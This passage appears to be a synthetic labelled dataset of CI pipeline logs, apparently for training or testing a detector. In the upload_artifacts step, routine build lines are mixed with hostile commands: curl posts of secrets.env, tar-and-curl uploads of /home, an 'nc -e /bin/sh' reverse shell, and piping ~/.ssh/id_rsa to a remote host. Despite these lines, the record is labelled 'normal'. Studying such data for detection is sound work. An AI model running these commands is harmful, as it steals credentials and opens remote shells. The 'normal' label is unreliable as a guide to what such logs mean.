          "  PASS: test_cache_hit (25ms)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-3995",
          "Cache hit for key-2733",
          "Cache hit for key-4607",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (143ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing react@5.16.0",
          "\u2713 lint completed",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-10T12:03:20.597258",
        "finished_at": "2025-12-10T12:03:32.930719",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u2713 lint completed",
          "Cache hit for key-2080",
          "[12:00:23] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (192ms)",
          "  PASS: test_cache_hit (455ms)",
          "Installing prettier@5.3.0",
          "  PASS: test_cache_hit (189ms)",
          "Installing lodash@3.10.0",
          "\u2713 test completed",
          "FAILED: test_user_create",
          "Cache hit for key-9513",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_user_create (3ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 test completed",
          "  PASS: test_db_connect (404ms)",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (399ms)",
          "Installing express@4.5.0",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "Cache hit for key-5074",
          "Cache hit for key-5914",
          "\u2713 test completed",
          "Cache hit for key-3967",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-2668",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Installing lodash@5.16.0",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (75ms)",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Installing webpack@1.2.0",
          "\u2713 test completed",
          "Installing prettier@2.15.0",
          "  PASS: test_user_create (350ms)",
          "  PASS: test_api_health (59ms)",
          "Cache hit for key-2777",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_user_create (337ms)",
          "Step 5/10: Building",
          "  PASS: test_api_health (304ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2149",
          "Compiling src/handler.rs...",
          "Cache hit for key-9430",
          "Step 7/10: Building",
          "  PASS: test_user_create (87ms)",
          "[12:00:23] INFO: Processing request",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Installing express@3.13.0",
          "[12:00:23] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-7483",
          "Cache hit for key-7142",
          "\u2713 build completed",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (428ms)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "  PASS: test_cache_hit (98ms)",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "Cache hit for key-2364",
          "  PASS: test_db_connect (496ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_db_connect (331ms)",
          "Compiling src/main.py...",
          "Cache hit for key-8629",
          "[12:00:23] ERROR: Connection failed",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (483ms)",
          "Cache hit for key-7344",
          "Step 6/10: Building",
          "\u2717 build failed with exit code 56",
          "Cache hit for key-8454",
          "Compiling src/index.js...",
          "Step 10/10: Building",
          "  PASS: test_user_create (124ms)",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Cache hit for key-1910",
          "  PASS: test_auth_login (494ms)",
          "Cache hit for key-8672",
          "Exception: TypeError",
          "Compiling src/index.js...",
          "Installing lodash@5.11.0",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 6/10: Building",
          "  PASS: test_db_connect (408ms)",
          "Step 8/10: Building",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-10T12:03:32.930719",
        "finished_at": "2025-12-10T12:03:45.264180",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Step 5/10: Building",
          "nc -e /bin/sh 120.191.131.197 6057",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:23] INFO: Processing request",
          "Installing jest@3.12.0",
          "  PASS: test_api_health (458ms)",
          "Installing react@4.12.0",
          "Step 4/10: Building",
          "Sending 177MB of data to acme.corp",
          "  PASS: test_db_connect (182ms)",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "Installing react@5.7.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-2468",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (338ms)",
          "Installing webpack@1.12.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 build completed",
          "  PASS: test_api_health (480ms)",
          "  PASS: test_cache_hit (180ms)",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (159ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "Installing react@4.10.0",
          "  PASS: test_auth_login (166ms)",
          "Cache hit for key-6849",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:23] ERROR: Connection failed",
          "FAILED: test_cache_hit",
          "Installing react@2.3.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing express@3.4.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 7/10: Building",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:23] INFO: Processing request",
          "Installing react@4.0.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing prettier@3.18.0",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Step 2/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_auth_login (371ms)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Step 10/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-3336",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (239ms)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Cache hit for key-9695",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2880",
          "  PASS: test_api_health (178ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-2579",
          "  PASS: test_auth_login (292ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing eslint@5.6.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 test completed",
          "Sending 59MB of data to acme.corp",
          "Cache hit for key-9653",
          "Compiling src/main.py...",
          "Step 7/10: Building",
          "Cache hit for key-4418",
          "Compiling src/service.java...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 111.33.217.166 17330",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "  PASS: test_api_health (431ms)",
          "Cache hit for key-2540",
          "Step 7/10: Building",
          "  PASS: test_db_connect (252ms)",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-7619",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (470ms)",
          "Step 7/10: Building",
          "=== Step upload_artifacts completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}